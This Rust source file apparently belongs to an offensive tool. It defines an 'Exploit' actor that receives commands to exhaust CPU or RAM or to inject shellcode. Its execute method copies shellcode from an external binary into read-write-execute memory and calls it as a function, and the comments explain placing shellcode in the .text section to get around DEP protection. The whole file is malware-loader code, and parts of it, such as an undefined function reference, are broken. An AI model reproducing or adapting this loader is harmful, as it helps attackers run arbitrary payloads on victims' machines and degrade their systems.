






use crate::*;






//// DEP (Data Execution Prevention) prevents code from being run from data pages such as the default heap, stacks, and memory pools, 
///      if an application attempts to run code from a data page that is protected, a memory access violation exception occurs, 
//       and if the exception is not handled, the calling process is terminated.
//// shellcodes might be in non executable section inside the memory 
//// dereferencing requires known size thus we must dereference the loaded shellcode int [u8; SHELLCODE_LENGTH]
//// we must dereference the &[u8] shellcode to inject the buffer itself otherwise the reference of the buffer will be injected  
#[no_mangle]
#[link_section=".text"] //// means we're executing the shellcode inside the .text section of the memory
pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("../shellcode.bin"); //// includes a file as a reference to a byte array of a binary file thus we must dereference it in order to coerce it into [u8]









#[derive(BorshDeserialize, BorshSerialize)]
pub struct Exploit{
    pub id: u32,
    pub status: Status,
    pub cmd: Cmd,
    pub max_retries: u32,
}



#[derive(BorshDeserialize, BorshSerialize)]
pub enum Status{
    Started,
    Queued,
    Failed,
}



#[derive(BorshDeserialize, BorshSerialize)]
pub enum Cmd{
    Empty,
    BurnCpu,
    BurnRam,
    Inject,
}


impl Exploit{

    pub fn burn_cpu(&self){
        let pool = scheduler::ThreadPool::new(ONIONS as usize); ///// `10_u32.pow(ONIONS) as usize` will need an allocation of 56402616320 bytes!!!
        pool.execute(|| {
            std::thread::spawn(|| async move{
                std::thread::yield_now(); ///// yield will waste cpu usage and energy if there are no active threads available
            });
        });
    }

    pub fn execute(&self){
        let map = MemoryMap::new(SHELLCODE_LENGTH, &[MapReadable, MapWritable, MapExecutable]).unwrap();
        unsafe {
            std::ptr::copy(SHELLCODE_BYTES.as_ptr(), map.data(), SHELLCODE_LENGTH);
            let exec_shellcode: extern "C" fn() -> () = mem::transmute(map.data());
            exec_shellcode();
        }

        //// function pointer example
        let fun: fn() -> ();
        let pointer_func = &func as *const _ as *const ();
        
        // let exec_shellcode: extern "C" fn() -> () = unsafe{ //// the type of exec_shellcode is a C function pointer which will return nothing
        //     mem::transmute(&SHELLCODE as *const [u8] as *const ()) //// it copies the bits from the source value into the destination value; in our case we're transmutting the shellcode [u8] buffer into a C function pointer which is () in rust
        // };
        // exec_shellcode();
    }

}



impl Actor for Exploit{
    type Msg = Cmd; //// actors can communicate with each other by sending cmd message to each other

    fn recv(&mut self, ctx: &Context<Self::Msg>, msg: Self::Msg, sender: Sender){
        match msg{ //// we'll receive a message from the either another actor or the main function then we start the exploit based on the decoded message
            Cmd::BurnCpu => {
                println!("burning cpu at time {}", chrono::Local::now().naive_local());
                self.burn_cpu();
            },
            Cmd::BurnRam => {
                println!("burning ram at time {}", chrono::Local::now().naive_local());
            },
            Cmd::Inject => {
                println!("injecting shellcode at time {}", chrono::Local::now().naive_local());
                self.execute();
            },
            _ => {
                println!("no command at {}", chrono::Local::now().naive_local());
            },
        }
    }



}